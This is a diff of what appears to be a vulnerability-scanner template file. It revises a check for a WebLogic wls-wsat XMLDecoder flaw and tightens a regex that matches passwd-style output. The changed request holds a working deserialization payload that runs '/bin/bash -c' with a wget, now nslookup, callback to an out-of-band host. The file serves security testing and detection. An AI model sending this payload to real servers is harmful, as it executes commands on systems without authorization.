@@ -11459,12 +11459,19 @@
               "part": "interactsh_protocol",
               "type": "word",
               "words": [
-                "http"
+                "dns"
               ]
+            },
+            {
+              "status": [
+                500
+              ],
+              "type": "status"
             }
           ],
+          "matchers-condition": "and",
           "raw": [
-            "POST /wls-wsat/CoordinatorPortType HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nAccept-Language: en\nContent-Type: text/xml\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soapenv:Envelope\n    xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n    <soapenv:Header>\n        <work:WorkContext\n            xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n            <java version=\"1.4.0\" class=\"java.beans.XMLDecoder\">\n                <void class=\"java.lang.ProcessBuilder\">\n                    <array class=\"java.lang.String\" length=\"3\">\n                        <void index=\"0\">\n                            <string>/bin/bash</string>\n                        </void>\n                        <void index=\"1\">\n                            <string>-c</string>\n                        </void>\n                        <void index=\"2\">\n                            <string>wget {{interactsh-url}}</string>\n                        </void>\n                    </array>\n                    <void method=\"start\"/></void>\n            </java>\n        </work:WorkContext>\n    </soapenv:Header>\n    <soapenv:Body/>\n</soapenv:Envelope>\n"
+            "POST /wls-wsat/CoordinatorPortType HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nAccept-Language: en\nContent-Type: text/xml\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soapenv:Envelope\n    xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n    <soapenv:Header>\n        <work:WorkContext\n            xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n            <java version=\"1.4.0\" class=\"java.beans.XMLDecoder\">\n                <void class=\"java.lang.ProcessBuilder\">\n                    <array class=\"java.lang.String\" length=\"3\">\n                        <void index=\"0\">\n                            <string>/bin/bash</string>\n                        </void>\n                        <void index=\"1\">\n                            <string>-c</string>\n                        </void>\n                        <void index=\"2\">\n                            <string>nslookup {{interactsh-url}}</string>\n                        </void>\n                    </array>\n                    <void method=\"start\"/></void>\n            </java>\n        </work:WorkContext>\n    </soapenv:Header>\n    <soapenv:Body/>\n</soapenv:Envelope>\n"
           ]
         }
       ]
@@ -13990,7 +13997,7 @@
           "matchers": [
             {
               "regex": [
-                "admin:.*:"
+                "admin:.*:*sh$"
               ],
               "type": "regex"
             },
